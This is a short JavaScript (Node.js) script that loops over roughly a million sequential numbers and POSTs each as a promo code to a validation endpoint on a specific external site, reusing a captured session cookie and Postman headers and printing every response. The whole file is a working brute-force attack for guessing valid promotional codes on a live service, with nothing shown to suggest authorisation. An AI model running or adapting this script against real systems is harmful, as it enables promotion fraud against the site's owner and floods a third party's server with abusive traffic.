var request = require("request");

for (var index =17299795 ; index < 18299796; index++) {
// console.log( index)
    
var options = { method: 'POST',
  url: 'http://mv1.in/ciplaomnigel/validatePromo',
  qs: { mobileno: 'number', code: index },
  headers: 
   { 'cache-control': 'no-cache',
     Connection: 'keep-alive',
     'Content-Length': '0',
     Cookie: 'JSESSIONID=3459BC9DBF83A702E305AF04102CB7D0.17BNS;newpind--cid=ce357141-66be-4e93-923e-09b7f5ddea4e',
     'Accept-Encoding': 'gzip, deflate',
     Host: 'mv1.in',
     'Postman-Token': '5cd381dc-3a0e-4ca7-b285-57767aff709f,7172159e-aa11-4769-88ed-a156efaea064',
     'Cache-Control': 'no-cache',
     Accept: '*/*',
     'User-Agent': 'PostmanRuntime/7.19.0' } };

     console.log(options)
request(options, function (error, response, body) {
  if (error) throw new Error(error);

  console.log("BODUYYYYYYY",body);
});
}
console.log("ancsa",index)